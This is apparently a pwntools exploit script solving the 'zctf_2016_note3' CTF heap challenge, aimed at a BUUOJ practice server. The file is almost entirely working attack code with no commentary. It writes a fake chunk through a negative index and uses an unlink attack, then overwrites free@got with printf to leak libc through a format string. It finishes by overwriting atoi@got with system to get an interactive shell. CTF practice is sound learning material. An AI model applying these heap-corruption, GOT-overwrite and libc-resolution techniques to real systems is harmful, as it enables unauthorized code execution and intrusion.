from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './zctf_2016_note3'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',26641) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(len,content='a'*8):
    sla('>>','1')
    sla('1024)',str(len))
    sla('content:',content)

def show(index):
    sla('>>','2')
    sla('note:',str(index))

def edit(index,content):
    sla('>>','3')
    sla('note:',str(index))
    sla('content:',content)

def delete(index):
    sla('>>','4')
    sla('note:',str(index))

negative = 0x8000000000000000
for i in range(8):
	add(0x200)
edit(3,'a')
fd = 0x6020c8+0x8*3-0x18
bk = 0x6020c8+0x8*3-0x10
fake_chunk = flat(0,0x201,fd,bk).ljust(0x200,'a')
fake_chunk += flat(0x200,0x210)
edit(-negative,fake_chunk)
delete(4)

edit(3,p64(elf.got['free']))
edit(0,p64(elf.plt['printf'])*2)

bss_blank = 0x602100
edit(3,p64(bss_blank))
edit(0,'%llx.'*0x10)
delete(0)
lsmr = int(ru('success').split('.')[10],16)
system,binsh = ret2libc(lsmr,'__libc_start_main_ret')
edit(3,p64(elf.got['atoi']))
edit(0,p64(system))

sla('>>','/bin/sh\x00')
# end

itr()